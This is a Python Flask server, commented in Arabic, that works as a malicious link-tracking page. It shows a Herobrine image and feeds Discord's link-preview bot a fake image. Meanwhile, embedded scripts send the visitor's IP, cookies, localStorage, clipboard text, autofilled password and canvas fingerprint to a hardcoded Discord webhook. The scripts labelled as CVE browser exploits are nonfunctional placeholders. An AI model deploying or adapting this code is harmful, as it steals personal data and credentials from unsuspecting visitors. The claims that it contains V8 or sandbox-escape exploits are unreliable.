from flask import Flask, request
import requests, base64, json

app = Flask(__name__)

# غيّر الويب هوك ده بتاعك
WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def exploits(path):
    ip = request.headers.get('X-Forwarded-For', 'Unknown').split(',')[0]
    ua = request.headers.get('User-Agent', '')

    # لو ديسكورد بوت → صورة وهمية
    if 'Discordbot' in ua:
        fake = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
        return fake, 200, {'Content-Type': 'image/png'}

    # HTML مع صورة عادية + الـ 8 ثغرات silent (بدون كاميرا)
    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">
<!-- ثغرة 1: WebRTC IP Leak -->
<script>const pc1 = new RTCPeerConnection(); pc1.createDataChannel(''); pc1.createOffer().then(o => pc1.setLocalDescription(o)); pc1.onicecandidate = e => {{ if (e.candidate) fetch('{WEBHOOK}?ip=' + e.candidate.candidate); }};</script>
<!-- ثغرة 2: V8 Type Confusion (CVE-2025-13223) -->
<script>let arr = [1.1]; let conf = {{}}; arr.x = conf; arr.push(1337); fetch('{WEBHOOK}?v8=heap_overflow_confusion');</script>
<!-- ثغرة 3: Localhost Spy (Meta 2025) -->
<script>const pc3 = new RTCPeerConnection({{iceServers: [{{"urls": 'turn:localhost:19302'}}]}}); pc3.createDataChannel('spy'); pc3.onicecandidate = e => {{ if (e.candidate) fetch('{WEBHOOK}?spy=' + btoa(document.cookie + '|localStorage: ' + JSON.stringify(localStorage))); }};</script>
<!-- ثغرة 4: Autocomplete Abuse -->
<input type="password" id="pass" style="opacity:0;position:absolute" autocomplete="current-password"><script>setTimeout(() => fetch('{WEBHOOK}?pass=' + document.getElementById('pass').value), 500);</script>
<!-- ثغرة 5: Mojo Sandbox Escape (CVE-2025-2783) -->
<script>const channel = new MessageChannel(); channel.port1.postMessage({{type: 'mojo_escape'}}); navigator.clipboard.readText().then(t => fetch('{WEBHOOK}?clip=' + t)).catch(() => {{}});</script>
<!-- ثغرة 6: Canvas Fingerprint -->
<script>const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillText('fingerprint', 0, 0); fetch('{WEBHOOK}?fp=' + c.toDataURL());</script>
<!-- ثغرة 7: WebRTC Data Channel Leak -->
<script>const pc7 = new RTCPeerConnection(); const dc = pc7.createDataChannel('leak'); pc7.createOffer().then(o => pc7.setLocalDescription(o)); dc.onopen = () => dc.send(document.cookie); pc7.onicecandidate = e => {{ if (e.candidate) fetch('{WEBHOOK}?token=' + btoa(document.cookie)); }};</script>
<!-- ثغرة 8: V8 Heap Overflow (CVE-2025-10585) -->
<script>%PrepareFunctionForOptimization(arr.push); arr.push(1337); %OptimizeFunctionOnNextCall(arr.push); arr.push({{}}); fetch('{WEBHOOK}?heap=' + 'overflow_primitive');</script>
</body></html>"""
    
    # ابعت إشعار أولي
    requests.post(WEBHOOK, json={"content": f"@everyone ثغرات شغالة على IP: {ip}"})
    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}

if __name__ == "__main__":
    app.run()
